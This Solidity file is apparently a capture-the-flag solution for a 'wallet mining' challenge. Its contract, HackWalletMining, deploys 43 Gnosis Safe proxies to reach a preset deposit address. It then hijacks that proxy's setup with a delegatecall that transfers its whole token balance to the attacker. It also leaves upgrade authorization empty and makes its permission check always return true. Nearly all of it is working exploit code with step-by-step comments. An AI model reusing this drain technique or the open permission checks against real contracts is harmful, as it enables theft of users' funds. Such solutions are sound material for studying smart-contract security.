// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import { WalletDeployer } from "./WalletDeployer.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


contract HackWalletMining is UUPSUpgradeable, GnosisSafe {
    GnosisSafe masterCopy;
    WalletDeployer walletDeployer;
    constructor(WalletDeployer _walletDeployer) {
        walletDeployer = _walletDeployer;
    }

    // This function is going to be call from the proxy with a delegate call
    // This way address(this) is the proxy and it going to transfer all its tokens to the player
    function transferTokens(address _token, address _player) external {
        IERC20(_token).transfer(_player, IERC20(_token).balanceOf(address(this)));
    }

    function hack(address _player, address _token) public {
        address proxy;
        // We're going to create 43 proxy in order to reach nonce 43
        // Nonce 43 is the one that creates the DEPOSIT_ADDRESS
        for (uint i = 0; i < 43; i++) {
            // For 42 proxies we just gonna pass an empty byte as argument
            if (i < 42) {
                walletDeployer.drop("");
            } else {
                // We're going to encode the callback so the proxy calls our transferTokens function
                bytes memory encodedCallback = abi.encodeWithSignature(
                    "transferTokens(address,address)",
                    _token,
                    _player
                );
                // Encode the call to the setUp function of the proxy
                // The third argument is the address to which is going to make delegate call
                // The four argument are the bytes that is going to use in this delegate call
                address[] memory owners = new address[](1);
                owners[0] = address(this);
                bytes memory data = abi.encodeWithSelector(
                    masterCopy.setup.selector,
                    owners,
                    1,
                    address(this),
                    encodedCallback,
                    address(0),
                    address(0),
                    0,
                    address(0)
                );
                // Create our 43th proxy
                walletDeployer.drop(data);
                // Also transfer all the token that the wallet Deployer had paid to us for creating proxies
                this.transferTokens(_token, _player);
            }
        }
    }

    // Needed because this contract inherits UUPSUpgradeable 
    function _authorizeUpgrade(address imp) internal override {}

    // This way we authorize everybody to use the WalletDeployer contract
    function can(address usr, address aim) external view returns (bool) {
        return true;
    }

}